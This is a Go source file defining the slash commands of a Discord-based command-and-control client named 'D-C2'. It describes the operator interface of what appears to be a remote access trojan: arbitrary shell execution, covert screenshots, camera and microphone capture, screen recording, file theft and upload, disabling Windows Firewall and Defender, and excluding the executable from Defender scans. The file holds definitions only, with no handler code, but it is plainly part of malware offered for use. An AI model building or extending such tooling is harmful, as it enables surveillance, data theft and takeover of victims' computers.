package commands

// This file holds the slash-command definitions registered with Discord. It is
// data only: handling lives in the other files in this package.

import "github.com/bwmarrin/discordgo"

// Definitions returns every slash command this client exposes.
func Definitions() []*discordgo.ApplicationCommand {
	return []*discordgo.ApplicationCommand{
		{
			Name:        "help",
			Description: "Show D‑C2 help menu for this device channel",
		},
		{
			Name:        "cmd",
			Description: "Run a shell command on this device",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "command",
					Description: "Shell command to run",
					Required:    true,
				},
			},
		},
		{
			Name:        "screenshot",
			Description: "Capture screenshots of all displays on this device",
		},
		{
			Name:        "camera",
			Description: "Capture a snapshot from the default camera",
		},
		{
			Name:        "mic",
			Description: "Record from the microphone on this device",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionInteger,
					Name:        "duration",
					Description: "Duration in seconds (1-300)",
				},
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "path",
					Description: "Destination file path on this device",
				},
			},
		},
		{
			Name:        "record",
			Description: "Record video with automatic segmented files for Discord upload",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "source",
					Description: "Recording source: camera or screen",
					Required:    true,
					Choices: []*discordgo.ApplicationCommandOptionChoice{
						{Name: "camera", Value: "camera"},
						{Name: "screen", Value: "screen"},
					},
				},
				{
					Type:        discordgo.ApplicationCommandOptionInteger,
					Name:        "max_size_mb",
					Description: "Maximum size per file in MB (1-8)",
				},
				{
					Type:        discordgo.ApplicationCommandOptionInteger,
					Name:        "duration_minutes",
					Description: "Total recording duration in minutes",
				},
				{
					Type:        discordgo.ApplicationCommandOptionInteger,
					Name:        "max_parts",
					Description: "Maximum number of segments to record (1-30)",
				},
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "quality",
					Description: "Video quality (low, medium, high)",
					Choices: []*discordgo.ApplicationCommandOptionChoice{
						{Name: "low", Value: "low"},
						{Name: "medium", Value: "medium"},
						{Name: "high", Value: "high"},
					},
				},
			},
		},
		{
			Name:        "recordstop",
			Description: "Stop the current video recording for this device",
		},
		{
			Name:        "log",
			Description: "Stream or stop Go logs into this device channel",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "mode",
					Description: "on or off",
					Required:    true,
					Choices: []*discordgo.ApplicationCommandOptionChoice{
						{Name: "on", Value: "on"},
						{Name: "off", Value: "off"},
					},
				},
			},
		},
		{
			Name:        "cwd",
			Description: "Show current working directory on this device",
		},
		{
			Name:        "ls",
			Description: "List a directory on this device",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "path",
					Description: "Directory to list (empty for current directory)",
				},
			},
		},
		{
			Name:        "ps",
			Description: "List running processes on this device",
		},
		{
			Name:        "pidinfo",
			Description: "Show information about a specific process ID",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionInteger,
					Name:        "pid",
					Description: "Process ID to inspect",
					Required:    true,
				},
			},
		},
		{
			Name:        "winsec",
			Description: "Show Windows firewall and Defender status for this device",
		},
		{
			Name:        "winfirewall",
			Description: "Turn Windows firewall on or off",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "mode",
					Description: "on or off",
					Required:    true,
					Choices: []*discordgo.ApplicationCommandOptionChoice{
						{Name: "on", Value: "on"},
						{Name: "off", Value: "off"},
					},
				},
			},
		},
		{
			Name:        "windefender",
			Description: "Turn Windows Defender real-time protection on or off",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "mode",
					Description: "on or off",
					Required:    true,
					Choices: []*discordgo.ApplicationCommandOptionChoice{
						{Name: "on", Value: "on"},
						{Name: "off", Value: "off"},
					},
				},
			},
		},
		{
			Name:        "windefenderexclude",
			Description: "Exclude a path from Windows Defender scans",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "path",
					Description: "Path to exclude (empty for current executable)",
				},
			},
		},
		{
			Name:        "download",
			Description: "Download a file from this device",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "source",
					Description: "Source file path on this device",
					Required:    true,
				},
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "destination",
					Description: "Destination label (for your reference)",
				},
			},
		},
		{
			Name:        "upload",
			Description: "Upload an attachment to this device",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionAttachment,
					Name:        "source",
					Description: "Source attachment to upload",
					Required:    true,
				},
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "destination",
					Description: "Destination file path on this device",
					Required:    true,
				},
			},
		},
		{
			Name:        "restart",
			Description: "Restart this client process",
		},
	}
}
